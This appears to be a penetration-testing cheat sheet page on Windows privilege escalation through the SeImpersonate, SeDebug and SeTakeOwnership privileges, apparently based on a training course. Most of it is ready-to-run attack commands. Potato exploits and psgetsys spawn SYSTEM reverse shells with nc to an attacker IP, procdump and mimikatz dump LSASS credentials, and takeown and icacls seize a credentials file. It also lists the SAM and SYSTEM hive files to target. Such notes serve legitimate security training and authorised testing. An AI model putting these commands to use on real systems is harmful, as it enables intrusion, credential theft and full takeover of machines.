# User Privileges

### SeImpersonate and SeAssignPrimaryToken

We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an [ASP.NET](http://asp.net/) web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries). Whenever we gain access in this way, we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges.

#### **SeImpersonate Example - JuicyPotato**

This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\\SYSTEM`

{% embed url="https://github.com/ohpe/juicy-potato" %}

```shellscript
# Use the exploit to catch a SYSTEM reverse shell => the COM port can be any port
# Important to pass the whole path to the nc binary
.\JuicyPotato.exe -l <COM_SERVER_LISTENING_PORT> -p C:\Windows\System32\cmd.exe -a "/c <PATH_TO_NC.EXE> -e cmd.exe <ATTACKER_IP> <NC_PORT>" -t *
```

If we get an error running the tool, run the `systeminfo` command to get the OS version and look at

[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) to get a working `CLSID`

#### PrintSpoofer, RoguePotato, GodPotato

<mark style="background-color:$danger;">JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards</mark>. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\\SYSTEM` level access

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

{% embed url="https://github.com/antonioCoco/RoguePotato" %}

{% embed url="https://github.com/BeichenDream/GodPotato" %}

```shellscript
# PrintSpoofer 
.\PrintSpoofer.exe -c "<PATH_TO_NC.EXE> -e cmd.exe <IP> <PORT>"

# GodPotato
.\GodPotato-NET4.exe -cmd "<CMD>"
```

### SeDebugPrivilege

<mark style="background-color:$danger;">Only visible through admin powershell console</mark>

Used to capture sensitive information from system memory, or access/modify kernel and application structures. We can use this privilege to dump processes memory

#### Dump Credentials

{% embed url="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" %}

```shellscript
# Dump lsass process memory => stored user credentials
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Start mimikatz and log the output to a file
mimikatz.exe
log

# Load the memory file
sekurlsa::minidump lsass.dmp

# Dump the credentials from the file 
sekurlsa::logonpasswords
```

If we are not able to load tools to the target, look at the pypykatz section in [https://app.gitbook.com/o/OzCeXZoR6hIZ3S7aPLrj/s/d1x5yxrrjMQ55ObqBQ44/\~/edit/\~/changes/2/others/credential-dumping/lsass](https://app.gitbook.com/o/OzCeXZoR6hIZ3S7aPLrj/s/d1x5yxrrjMQ55ObqBQ44/~/edit/~/changes/2/others/credential-dumping/lsass)

If we are not able to load tools to the target, but we have RDP access, we can make a dump from the task manager ⇒ Details ⇒ lsass.exe ⇒ create dump file

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FSGUsEnzdvj7GjCBFdKgb%2Fimage.png?alt=media&#x26;token=3d987d5a-b6ef-4a6c-b44d-5a7ac42945c9" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
If we see the privilege as Disabled, try to migrate to a better shell using `RunasCs` for example. Maybe in that new shell the privilege will be enabled. Also try to change from cmd to powershell. From a shell where the privilege is enabled, grab a meterpreter shell, then use the command `ps` to find processes running as SYSTEM, then we can just migrate to it to get a SYSTEM shell
{% endhint %}

#### RCE as SYSTEM

{% embed url="https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1" %}

```shellscript
# Transfer the script above to the target machine

# Load the script 
. .\psgetsys.ps1

# Execute the script => Spawn a SYSTEM shell (usefull if we have RDP)
ImpersonateFromParentPid -ppid (Get-Process "lsass").Id -command "C:\Windows\System32\cmd.exe"

# Or get a reverse shell 
ImpersonateFromParentPid -ppid 616 -command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -cmdargs "-e <BASE64>"
ImpersonateFromParentPid -ppid 616 -command "C:\Tools\nc.exe" -cmdargs "10.10.14.99 4444 -e C:\Windows\System32\cmd.exe"

# If we get an error, look up the pid for a SYSTEM ran process (winlogon, lsass ...)
tasklist
```

### SeTakeOwnershipPrivilege

<mark style="background-color:$danger;">Only visible through admin powershell console</mark>

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE\_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor

```shellscript
# Check privilege
whoami /priv

# The privilege should be disabled, so enable it
https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

# Use the above script to enable the privilege
# Import-Module .\\Enable-Privilege.ps1  présent dans le cours mais pas nécessaire ?
.\\EnableAllTokenPrivs.ps1
whoami /priv
```

Scenario of use :

Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with `Public` and `Private` directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials). For our scenario, let's assume that we have access to the target company's file share and can freely browse both the `Private` and `Public` subdirectories. For the most part, we find that permissions are set up strictly, and we have not found any interesting information on the `Public` portion of the file share. In browsing the `Private` portion, we find that all Domain Users can list the contents of certain subdirectories but get an `Access denied` message when trying to read the contents of most files. We find a file named `cred.txt` under the `IT` subdirectory of the `Private` share folder during our enumeration.

Given that our user account has `SeTakeOwnershipPrivilege` (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.

```shellscript
# Get more information about the target file 
Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# If the owner is not shown, we probably don't have enough permissions over the object 
# Instead, we can check the ownership of the directory it is located in
cmd /c dir /q 'C:\\Department Shares\\Private\\IT'

# Take ownership of the file
takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt' 

# Check the ownership change$
Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# We may still not be able to read the file and need to modify the file ACL using icacls
cat 'C:\\Department Shares\\Private\\IT\\cred.txt'    # It may fail
icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F
```

Files of interest :

```shellscript
c:\\inetpub\\wwwwroot\\web.config
%WINDIR%\\repair\\sam
%WINDIR%\\repair\\system
%WINDIR%\\repair\\software, %WINDIR%\\repair\\security
%WINDIR%\\system32\\config\\SecEvent.Evt
%WINDIR%\\system32\\config\\default.sav
%WINDIR%\\system32\\config\\security.sav
%WINDIR%\\system32\\config\\software.sav
%WINDIR%\\system32\\config\\system.sav
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
